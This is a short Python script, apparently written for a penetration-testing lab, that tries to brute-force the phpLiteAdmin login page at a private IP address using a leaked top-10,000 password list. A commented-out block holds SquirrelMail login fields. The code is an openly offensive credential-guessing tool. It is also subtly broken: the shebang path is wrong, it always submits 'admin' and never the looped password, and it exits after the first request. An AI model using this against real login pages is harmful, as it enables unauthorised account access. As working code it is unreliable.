#!/usr/env/bin python
import requests
from pprint import pprint
'''
cookies = {
	'squirrelmail_language': 'deleted',
	'SQMSESSID': 'r2988l2h6meb7c7nd95u804691',
}

headers = {
	'Connection':'keep-alive',
	'Cache-Control': 'max-age=0',
	'Upgrade-Insecure-Requests': '1',
	...
	'Accept-Language': 'en-US,en ;q=0.9',
}

data = {

	'login_username': 'name',
	'secretkey': 'password',
	'js_autodetect_results': '1',
	'just_logged_in':'1'
	
}

'''
username = 'aaa'

passwords = [ x.strip() for x in open('darkweb2017-top10000.txt').read().split('\n') if x ]

for password in passwords:
	cookies = {
		'PHPSESSID':'r4ip5lqpkorn41h28gmtmuoc34'
	}

	headers = {
		'Host': '10.11.1.116',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '58',
		'Origin': 'http://10.11.1.116',
		'Connection': 'close',
		'Referer': 'http://10.11.1.116/db/phpliteadmin.php',
	}

	data = {
		'password': 'admin',
		'remember' : 'yes',
		'login' : 'Log+In',
		'proc_login' : 'true',
		
	}

	response = requests.post('http://10.11.1.116/db/phpliteadmin.php', headers=headers, cookies=cookies, data=data)
	print(response.status_code)
	print(response.text)
	exit(0)

	if "Incorrect password." not in response.text:
		print('found password', password)
